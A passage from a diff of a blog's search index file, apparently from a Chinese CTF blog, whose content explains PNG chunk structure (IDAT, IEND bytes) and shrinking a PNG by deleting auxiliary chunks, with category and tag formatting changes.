27 数据长为39字节</li><li>49 44 41 54 IDAT标识</li><li>78 9C…… 压缩的数据，LZ77派生压缩方法</li><li>DA 12 06 A5 CRC校验</li></ul><p>IDAT中压缩数据部分在后面会有详细的介绍。</p><p><strong>000000F9~00000104：</strong></p><p>IEND数据块，这部分正如上所说，通常都应该是</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>至此，我们已经能够从一个PNG文件中识别出各个数据块了。由于PNG中规定除关键数据块外，其它的辅助数据块都为可选部分，因此，有了这个标准后，我们可以通过删除所有的辅助数据块来减少PNG文件的大小。（当然，需要注意的是，PNG格式可以保存图像中的层、文字等信息，一旦删除了这些辅助数据块后，图像将失去原来的可编辑性。）</p><p>删除了辅助数据块后的PNG文件，现在文件大小为147字节，原文件大小为261字节，文件大小减少后，并不影响图像的内容。</p><ul><li>如上说过，IDAT数据块是使用了LZ77压缩算法生成的，由于受限于手机处理器</li></ul>]]></content>
+      
+      
       <categories>
-        <category>CTF</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>隐写</tag>
-        <tag>工具使用</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> 隐写 </tag>
+            
+            <tag> 文件结构 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
